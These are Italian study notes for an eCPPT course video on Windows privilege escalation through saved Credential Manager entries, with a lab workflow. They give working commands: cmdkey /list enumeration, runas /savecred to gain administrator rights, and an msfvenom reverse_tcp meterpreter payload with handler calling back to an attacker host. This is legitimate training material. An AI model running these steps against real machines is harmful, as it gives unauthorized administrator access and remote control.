# 06 — Windows Credential Manager (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 6/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [06_Windows Credential Manager.txt](06_Windows Credential Manager.txt) · [06_Windows Credential Manager.srt](06_Windows Credential Manager.srt)

## Concetti chiave

- **Windows Credential Manager** = password manager built-in di Windows (analogo a Keychain di macOS).
- Memorizza credenziali per servizi web, applicazioni, condivisioni di rete, account locali.
- Si interagisce via **`cmdkey`** dal command line.
- **Misconfig di privesc**: credenziali admin salvate, accessibili da standard user → si possono **usare senza vederle in clear** tramite `runas /savecred`.
- La password **NON viene mostrata** da `cmdkey /list`, ma può essere **utilizzata** per autenticarsi.

## Spiegazione approfondita

### `cmdkey` — funzionalità
- **`cmdkey /add`** — aggiunge credenziali
- **`cmdkey /list`** — elenca credenziali salvate (NON mostra password)
- **`cmdkey /delete`** — rimuove credenziali

### Il trucco di `runas /savecred`
- L'opzione `/savecred` istruisce `runas` a **leggere le credenziali da Credential Manager** invece di chiederle.
- Permette di **eseguire qualsiasi binario** come l'utente target **senza conoscere la password**.
- Se le credenziali di Administrator sono salvate → bypass totale.

### Workflow del lab
1. Accesso come `student` non privilegiato.
2. `cmdkey /list` → identifica credenziali salvate per `administrator`.
3. La password NON è visibile, ma:
4. `runas /savecred /user:administrator cmd` → apre cmd come admin senza inserire password.
5. Demo avanzata: stessa tecnica via meterpreter — `runas /savecred /user:administrator shell.exe` per ottenere reverse meterpreter come admin.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `whoami /priv` | Verifica privilegi corrente |
| `net localgroup administrators` | Lista admin |
| `cmdkey /list` | Lista credenziali salvate in Credential Manager |
| `runas.exe /savecred /user:administrator cmd` | Esegue cmd come admin usando saved creds |
| `runas.exe /savecred /user:administrator <payload.exe>` | Esegue payload arbitrario come admin |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=5555 -f exe -o shell.exe` | Genera payload da iniettare |
| `use exploit/multi/handler` (msf) | Listener per il payload |

## Esempi pratici

```cmd
:: Step 1 — Verifica utente
whoami
whoami /priv
net localgroup administrators

:: Step 2 — Elenca credenziali salvate
cmdkey /list
:: Output esempio:
:: Target: Domain:interactive=ADMINISTRATOR
:: Type: Domain Password
:: User: administrator
:: (password NON mostrata)

:: Step 3 — Sfruttamento locale (apre cmd come admin)
runas.exe /savecred /user:administrator cmd
```

```bash
# Step 4 — Sfruttamento via meterpreter (low-priv session)
# 4a. Genera payload su Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=5555 -f exe -o shell.exe

# 4b. Setup handler
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 5555
exploit -j

# 4c. Nella sessione meterpreter come student:
# upload shell.exe
# shell
# runas.exe /savecred /user:administrator C:\Users\student\shell.exe
# → seconda sessione meterpreter con privilegi admin
```

## Punti d'attenzione per l'esame eCPPT

- **Comando chiave**: `cmdkey /list` per enumerare e `runas /savecred` per sfruttare.
- **Punto importante**: NON serve conoscere la password — `/savecred` la legge da Credential Manager automaticamente.
- Misconfig: Credential Manager **per-user**, ma se admin ha salvato credenziali e `student` può invocare `runas /savecred` → privesc.
- Differenza da credenziali in clear (Unattend, PS history): qui le creds sono **opache** ma comunque utilizzabili.
- Da remote (no RDP, solo meterpreter): tecnica funziona uploadando un **payload .exe** da eseguire via `runas`, non `cmd`.
- Tecnica "live-of-the-land" — usa solo binari nativi Windows → bassa rumorosità.

## Collegamenti con altri video

- Precedente: [[05_ Unattended Installation Files]] — primo vettore di locally stored creds.
- Prossimo: [[07_ PowerShell History]] — terzo vettore di locally stored creds.
- Strumento sopra usato: [[03_Privilege Escalation with PowerUp]] (PowerUp identifica anche credenziali salvate).
